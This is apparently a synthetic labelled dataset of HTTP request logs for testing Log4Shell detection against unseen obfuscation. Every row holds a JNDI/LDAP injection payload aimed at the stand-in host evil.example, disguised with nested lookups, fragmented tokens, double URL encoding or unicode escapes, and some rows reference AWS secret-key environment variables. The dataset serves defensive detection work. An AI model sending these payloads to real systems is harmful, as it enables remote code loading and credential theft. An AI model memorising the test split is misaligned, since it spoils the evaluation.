id,timestamp,source,raw_log,normalized_log,label,attack_family,obfuscation_type,field,split,risk_level
LS-000115,2026-05-17,synthetic,POST /search HTTP/1.1 Host: app.local Body: query=${${upper:j}${upper:n}${upper:d}${upper:i}:ldap://evil.example/upper},post /search http/1.1 host: app.local body: query=${jndi:ldap://evil.example/upper},1,log4shell,nested_lookup_lower_upper_lookup,body,unseen_obfuscation_test,critical
LS-000116,2026-05-17,synthetic,GET /?q=${${upper:j}${upper:n}${upper:d}${upper:i}:ldap://evil.example/upper} HTTP/1.1,get /?q=${jndi:ldap://evil.example/upper} http/1.1,1,log4shell,nested_lookup_lower_upper_lookup,minimal_query,unseen_obfuscation_test,critical
LS-000117,2026-05-17,synthetic,GET /api/check?debug=${${upper:j}${upper:n}${upper:d}${upper:i}:ldap://evil.example/upper} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldap://evil.example/upper} http/1.1 host: app.local,1,log4shell,nested_lookup_lower_upper_lookup,uri_param,unseen_obfuscation_test,critical
LS-000118,2026-05-17,synthetic,Request from User-Agent: ${${upper:j}${upper:n}${upper:d}${upper:i}:ldap://evil.example/upper} | Method: GET | Host: app.local | Path: /,request from user-agent: ${jndi:ldap://evil.example/upper} | method: get | host: app.local | path: /,1,log4shell,nested_lookup_lower_upper_lookup,user_agent,unseen_obfuscation_test,critical
LS-000119,2026-05-17,synthetic,Request from User-Agent: ${${upper:j}${upper:n}${upper:d}${upper:i}:ldap://evil.example/upper},request from user-agent: ${jndi:ldap://evil.example/upper},1,log4shell,nested_lookup_lower_upper_lookup,user_agent_minimal,unseen_obfuscation_test,critical
LS-000120,2026-05-17,synthetic,Request from User-Agent: Go-http-client/1.1 | Method: GET | Host: app.local | Path: / | X-Api-Version: ${${upper:j}${upper:n}${upper:d}${upper:i}:ldap://evil.example/upper},request from user-agent: go-http-client/1.1 | method: get | host: app.local | path: / | x-api-version: ${jndi:ldap://evil.example/upper},1,log4shell,nested_lookup_lower_upper_lookup,x_api_version,unseen_obfuscation_test,critical
LS-000121,2026-05-17,synthetic,GET /?q=${${env:AWS_SECRET_ACCESS_KEY:-j}${env:AWS_SECRET_ACCESS_KEY:-n}${env:AWS_SECRET_ACCESS_KEY:-d}${env:AWS_SECRET_ACCESS_KEY:-i}:ldap://evil.example/env} HTTP/1.1,get /?q=${jndi:ldap://evil.example/env} http/1.1,1,log4shell,nested_lookup_env_fallback,minimal_query,unseen_obfuscation_test,critical
LS-000122,2026-05-17,synthetic,GET /api/check?debug=${${env:AWS_SECRET_ACCESS_KEY:-j}${env:AWS_SECRET_ACCESS_KEY:-n}${env:AWS_SECRET_ACCESS_KEY:-d}${env:AWS_SECRET_ACCESS_KEY:-i}:ldap://evil.example/env} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldap://evil.example/env} http/1.1 host: app.local,1,log4shell,nested_lookup_env_fallback,uri_param,unseen_obfuscation_test,critical
LS-000123,2026-05-17,synthetic,Request from User-Agent: ${${env:AWS_SECRET_ACCESS_KEY:-j}${env:AWS_SECRET_ACCESS_KEY:-n}${env:AWS_SECRET_ACCESS_KEY:-d}${env:AWS_SECRET_ACCESS_KEY:-i}:ldap://evil.example/env} | Method: GET | Host: app.local | Path: /static/app.js,request from user-agent: ${jndi:ldap://evil.example/env} | method: get | host: app.local | path: /static/app.js,1,log4shell,nested_lookup_env_fallback,user_agent,unseen_obfuscation_test,critical
LS-000124,2026-05-17,synthetic,Request from User-Agent: ${${env:AWS_SECRET_ACCESS_KEY:-j}${env:AWS_SECRET_ACCESS_KEY:-n}${env:AWS_SECRET_ACCESS_KEY:-d}${env:AWS_SECRET_ACCESS_KEY:-i}:ldap://evil.example/env},request from user-agent: ${jndi:ldap://evil.example/env},1,log4shell,nested_lookup_env_fallback,user_agent_minimal,unseen_obfuscation_test,critical
LS-000125,2026-05-17,synthetic,Request from User-Agent: Mozilla/5.0 Safari/605.1.15 | Method: GET | Host: app.local | Path: /api/products?id=123 | X-Api-Version: ${${env:AWS_SECRET_ACCESS_KEY:-j}${env:AWS_SECRET_ACCESS_KEY:-n}${env:AWS_SECRET_ACCESS_KEY:-d}${env:AWS_SECRET_ACCESS_KEY:-i}:ldap://evil.example/env},request from user-agent: mozilla/5.0 safari/605.1.15 | method: get | host: app.local | path: /api/products?id=123 | x-api-version: ${jndi:ldap://evil.example/env},1,log4shell,nested_lookup_env_fallback,x_api_version,unseen_obfuscation_test,critical
LS-000126,2026-05-17,synthetic,GET /search?q=${${env:AWS_SECRET_ACCESS_KEY:-j}${env:AWS_SECRET_ACCESS_KEY:-n}${env:AWS_SECRET_ACCESS_KEY:-d}${env:AWS_SECRET_ACCESS_KEY:-i}:ldap://evil.example/env} HTTP/1.1 Host: app.local User-Agent: PostmanRuntime/7.36.1,get /search?q=${jndi:ldap://evil.example/env} http/1.1 host: app.local user-agent: postmanruntime/7.36.1,1,log4shell,nested_lookup_env_fallback,path,unseen_obfuscation_test,critical
LS-000127,2026-05-17,synthetic,POST /search HTTP/1.1 Host: app.local Body: query=${${env:AWS_SECRET_ACCESS_KEY:-j}${env:AWS_SECRET_ACCESS_KEY:-n}${env:AWS_SECRET_ACCESS_KEY:-d}${env:AWS_SECRET_ACCESS_KEY:-i}:ldap://evil.example/env},post /search http/1.1 host: app.local body: query=${jndi:ldap://evil.example/env},1,log4shell,nested_lookup_env_fallback,body,unseen_obfuscation_test,critical
LS-000128,2026-05-17,synthetic,GET /?q=${${env:AWS_SECRET_ACCESS_KEY:-j}${env:AWS_SECRET_ACCESS_KEY:-n}${env:AWS_SECRET_ACCESS_KEY:-d}${env:AWS_SECRET_ACCESS_KEY:-i}:ldap://evil.example/env} HTTP/1.1,get /?q=${jndi:ldap://evil.example/env} http/1.1,1,log4shell,nested_lookup_env_fallback,minimal_query,unseen_obfuscation_test,critical
LS-000129,2026-05-17,synthetic,GET /api/check?debug=${${env:AWS_SECRET_ACCESS_KEY:-j}${env:AWS_SECRET_ACCESS_KEY:-n}${env:AWS_SECRET_ACCESS_KEY:-d}${env:AWS_SECRET_ACCESS_KEY:-i}:ldap://evil.example/env} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldap://evil.example/env} http/1.1 host: app.local,1,log4shell,nested_lookup_env_fallback,uri_param,unseen_obfuscation_test,critical
LS-000130,2026-05-17,synthetic,Request from User-Agent: ${${env:AWS_SECRET_ACCESS_KEY:-j}${env:AWS_SECRET_ACCESS_KEY:-n}${env:AWS_SECRET_ACCESS_KEY:-d}${env:AWS_SECRET_ACCESS_KEY:-i}:ldap://evil.example/env} | Method: GET | Host: app.local | Path: /home,request from user-agent: ${jndi:ldap://evil.example/env} | method: get | host: app.local | path: /home,1,log4shell,nested_lookup_env_fallback,user_agent,unseen_obfuscation_test,critical
LS-000131,2026-05-17,synthetic,Request from User-Agent: ${${env:AWS_SECRET_ACCESS_KEY:-j}${env:AWS_SECRET_ACCESS_KEY:-n}${env:AWS_SECRET_ACCESS_KEY:-d}${env:AWS_SECRET_ACCESS_KEY:-i}:ldap://evil.example/env},request from user-agent: ${jndi:ldap://evil.example/env},1,log4shell,nested_lookup_env_fallback,user_agent_minimal,unseen_obfuscation_test,critical
LS-000132,2026-05-17,synthetic,Request from User-Agent: python-requests/2.31.0 | Method: GET | Host: app.local | Path: /static/app.js | X-Api-Version: ${${env:AWS_SECRET_ACCESS_KEY:-j}${env:AWS_SECRET_ACCESS_KEY:-n}${env:AWS_SECRET_ACCESS_KEY:-d}${env:AWS_SECRET_ACCESS_KEY:-i}:ldap://evil.example/env},request from user-agent: python-requests/2.31.0 | method: get | host: app.local | path: /static/app.js | x-api-version: ${jndi:ldap://evil.example/env},1,log4shell,nested_lookup_env_fallback,x_api_version,unseen_obfuscation_test,critical
LS-000133,2026-05-17,synthetic,GET /?q=${${::-j}${::-n}${::-d}${::-i}:ldap://evil.example/frag} HTTP/1.1,get /?q=${jndi:ldap://evil.example/frag} http/1.1,1,log4shell,nested_lookup_env_fallback_fragmented_tokens,minimal_query,unseen_obfuscation_test,critical
LS-000134,2026-05-17,synthetic,GET /api/check?debug=${${::-j}${::-n}${::-d}${::-i}:ldap://evil.example/frag} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldap://evil.example/frag} http/1.1 host: app.local,1,log4shell,nested_lookup_env_fallback_fragmented_tokens,uri_param,unseen_obfuscation_test,critical
LS-000135,2026-05-17,synthetic,Request from User-Agent: ${${::-j}${::-n}${::-d}${::-i}:ldap://evil.example/frag} | Method: GET | Host: app.local | Path: /,request from user-agent: ${jndi:ldap://evil.example/frag} | method: get | host: app.local | path: /,1,log4shell,nested_lookup_env_fallback_fragmented_tokens,user_agent,unseen_obfuscation_test,critical
LS-000136,2026-05-17,synthetic,Request from User-Agent: ${${::-j}${::-n}${::-d}${::-i}:ldap://evil.example/frag},request from user-agent: ${jndi:ldap://evil.example/frag},1,log4shell,nested_lookup_env_fallback_fragmented_tokens,user_agent_minimal,unseen_obfuscation_test,critical
LS-000137,2026-05-17,synthetic,Request from User-Agent: Mozilla/5.0 Chrome/120.0 | Method: GET | Host: app.local | Path: /api/products?id=123 | X-Api-Version: ${${::-j}${::-n}${::-d}${::-i}:ldap://evil.example/frag},request from user-agent: mozilla/5.0 chrome/120.0 | method: get | host: app.local | path: /api/products?id=123 | x-api-version: ${jndi:ldap://evil.example/frag},1,log4shell,nested_lookup_env_fallback_fragmented_tokens,x_api_version,unseen_obfuscation_test,critical
LS-000138,2026-05-17,synthetic,GET /search?q=${${::-j}${::-n}${::-d}${::-i}:ldap://evil.example/frag} HTTP/1.1 Host: app.local User-Agent: Mozilla/5.0 Chrome/120.0,get /search?q=${jndi:ldap://evil.example/frag} http/1.1 host: app.local user-agent: mozilla/5.0 chrome/120.0,1,log4shell,nested_lookup_env_fallback_fragmented_tokens,path,unseen_obfuscation_test,critical
LS-000139,2026-05-17,synthetic,POST /search HTTP/1.1 Host: app.local Body: query=${${::-j}${::-n}${::-d}${::-i}:ldap://evil.example/frag},post /search http/1.1 host: app.local body: query=${jndi:ldap://evil.example/frag},1,log4shell,nested_lookup_env_fallback_fragmented_tokens,body,unseen_obfuscation_test,critical
LS-000140,2026-05-17,synthetic,GET /?q=${${::-j}${::-n}${::-d}${::-i}:ldap://evil.example/frag} HTTP/1.1,get /?q=${jndi:ldap://evil.example/frag} http/1.1,1,log4shell,nested_lookup_env_fallback_fragmented_tokens,minimal_query,unseen_obfuscation_test,critical
LS-000141,2026-05-17,synthetic,GET /api/check?debug=${${::-j}${::-n}${::-d}${::-i}:ldap://evil.example/frag} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldap://evil.example/frag} http/1.1 host: app.local,1,log4shell,nested_lookup_env_fallback_fragmented_tokens,uri_param,unseen_obfuscation_test,critical
LS-000142,2026-05-17,synthetic,Request from User-Agent: ${${::-j}${::-n}${::-d}${::-i}:ldap://evil.example/frag} | Method: GET | Host: app.local | Path: /static/app.js,request from user-agent: ${jndi:ldap://evil.example/frag} | method: get | host: app.local | path: /static/app.js,1,log4shell,nested_lookup_env_fallback_fragmented_tokens,user_agent,unseen_obfuscation_test,critical
LS-000143,2026-05-17,synthetic,Request from User-Agent: ${${::-j}${::-n}${::-d}${::-i}:ldap://evil.example/frag},request from user-agent: ${jndi:ldap://evil.example/frag},1,log4shell,nested_lookup_env_fallback_fragmented_tokens,user_agent_minimal,unseen_obfuscation_test,critical
LS-000144,2026-05-17,synthetic,Request from User-Agent: Mozilla/5.0 Chrome/120.0 | Method: GET | Host: app.local | Path: / | X-Api-Version: ${${::-j}${::-n}${::-d}${::-i}:ldap://evil.example/frag},request from user-agent: mozilla/5.0 chrome/120.0 | method: get | host: app.local | path: / | x-api-version: ${jndi:ldap://evil.example/frag},1,log4shell,nested_lookup_env_fallback_fragmented_tokens,x_api_version,unseen_obfuscation_test,critical
LS-000145,2026-05-17,synthetic,GET /?q=%2524%257Bjndi%253Aldap%253A%252F%252Fevil.example%252Fdouble%257D HTTP/1.1,get /?q=${jndi:ldap://evil.example/double} http/1.1,1,log4shell,double_url_encoded,minimal_query,unseen_obfuscation_test,critical
LS-000146,2026-05-17,synthetic,GET /api/check?debug=%2524%257Bjndi%253Aldap%253A%252F%252Fevil.example%252Fdouble%257D HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldap://evil.example/double} http/1.1 host: app.local,1,log4shell,double_url_encoded,uri_param,unseen_obfuscation_test,critical
LS-000147,2026-05-17,synthetic,Request from User-Agent: %2524%257Bjndi%253Aldap%253A%252F%252Fevil.example%252Fdouble%257D | Method: GET | Host: app.local | Path: /api/products?id=123,request from user-agent: ${jndi:ldap://evil.example/double} | method: get | host: app.local | path: /api/products?id=123,1,log4shell,double_url_encoded,user_agent,unseen_obfuscation_test,critical
LS-000148,2026-05-17,synthetic,Request from User-Agent: %2524%257Bjndi%253Aldap%253A%252F%252Fevil.example%252Fdouble%257D,request from user-agent: ${jndi:ldap://evil.example/double},1,log4shell,double_url_encoded,user_agent_minimal,unseen_obfuscation_test,critical
LS-000149,2026-05-17,synthetic,Request from User-Agent: Mozilla/5.0 Safari/605.1.15 | Method: GET | Host: app.local | Path: /search?q=boots | X-Api-Version: %2524%257Bjndi%253Aldap%253A%252F%252Fevil.example%252Fdouble%257D,request from user-agent: mozilla/5.0 safari/605.1.15 | method: get | host: app.local | path: /search?q=boots | x-api-version: ${jndi:ldap://evil.example/double},1,log4shell,double_url_encoded,x_api_version,unseen_obfuscation_test,critical
LS-000150,2026-05-17,synthetic,GET /search?q=%2524%257Bjndi%253Aldap%253A%252F%252Fevil.example%252Fdouble%257D HTTP/1.1 Host: app.local User-Agent: Mozilla/5.0 Safari/605.1.15,get /search?q=${jndi:ldap://evil.example/double} http/1.1 host: app.local user-agent: mozilla/5.0 safari/605.1.15,1,log4shell,double_url_encoded,path,unseen_obfuscation_test,critical
LS-000151,2026-05-17,synthetic,POST /search HTTP/1.1 Host: app.local Body: query=%2524%257Bjndi%253Aldap%253A%252F%252Fevil.example%252Fdouble%257D,post /search http/1.1 host: app.local body: query=${jndi:ldap://evil.example/double},1,log4shell,double_url_encoded,body,unseen_obfuscation_test,critical
LS-000152,2026-05-17,synthetic,GET /?q=%2524%257Bjndi%253Aldap%253A%252F%252Fevil.example%252Fdouble%257D HTTP/1.1,get /?q=${jndi:ldap://evil.example/double} http/1.1,1,log4shell,double_url_encoded,minimal_query,unseen_obfuscation_test,critical
LS-000153,2026-05-17,synthetic,GET /api/check?debug=%2524%257Bjndi%253Aldap%253A%252F%252Fevil.example%252Fdouble%257D HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldap://evil.example/double} http/1.1 host: app.local,1,log4shell,double_url_encoded,uri_param,unseen_obfuscation_test,critical
LS-000154,2026-05-17,synthetic,Request from User-Agent: %2524%257Bjndi%253Aldap%253A%252F%252Fevil.example%252Fdouble%257D | Method: GET | Host: app.local | Path: /login,request from user-agent: ${jndi:ldap://evil.example/double} | method: get | host: app.local | path: /login,1,log4shell,double_url_encoded,user_agent,unseen_obfuscation_test,critical
LS-000155,2026-05-17,synthetic,Request from User-Agent: %2524%257Bjndi%253Aldap%253A%252F%252Fevil.example%252Fdouble%257D,request from user-agent: ${jndi:ldap://evil.example/double},1,log4shell,double_url_encoded,user_agent_minimal,unseen_obfuscation_test,critical
LS-000156,2026-05-17,synthetic,Request from User-Agent: Mozilla/5.0 Chrome/120.0 | Method: GET | Host: app.local | Path: /static/app.js | X-Api-Version: %2524%257Bjndi%253Aldap%253A%252F%252Fevil.example%252Fdouble%257D,request from user-agent: mozilla/5.0 chrome/120.0 | method: get | host: app.local | path: /static/app.js | x-api-version: ${jndi:ldap://evil.example/double},1,log4shell,double_url_encoded,x_api_version,unseen_obfuscation_test,critical
LS-000157,2026-05-17,synthetic,GET /?q=${\u006a\u006e\u0064\u0069:ldap://evil.example/unicode} HTTP/1.1,get /?q=${jndi:ldap://evil.example/unicode} http/1.1,1,log4shell,unicode_escape,minimal_query,unseen_obfuscation_test,critical
LS-000158,2026-05-17,synthetic,GET /api/check?debug=${\u006a\u006e\u0064\u0069:ldap://evil.example/unicode} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldap://evil.example/unicode} http/1.1 host: app.local,1,log4shell,unicode_escape,uri_param,unseen_obfuscation_test,critical
LS-000159,2026-05-17,synthetic,Request from User-Agent: ${\u006a\u006e\u0064\u0069:ldap://evil.example/unicode} | Method: GET | Host: app.local | Path: /metrics,request from user-agent: ${jndi:ldap://evil.example/unicode} | method: get | host: app.local | path: /metrics,1,log4shell,unicode_escape,user_agent,unseen_obfuscation_test,critical
LS-000160,2026-05-17,synthetic,Request from User-Agent: ${\u006a\u006e\u0064\u0069:ldap://evil.example/unicode},request from user-agent: ${jndi:ldap://evil.example/unicode},1,log4shell,unicode_escape,user_agent_minimal,unseen_obfuscation_test,critical
LS-000161,2026-05-17,synthetic,Request from User-Agent: Java/11.0.13 | Method: GET | Host: app.local | Path: /static/app.js | X-Api-Version: ${\u006a\u006e\u0064\u0069:ldap://evil.example/unicode},request from user-agent: java/11.0.13 | method: get | host: app.local | path: /static/app.js | x-api-version: ${jndi:ldap://evil.example/unicode},1,log4shell,unicode_escape,x_api_version,unseen_obfuscation_test,critical
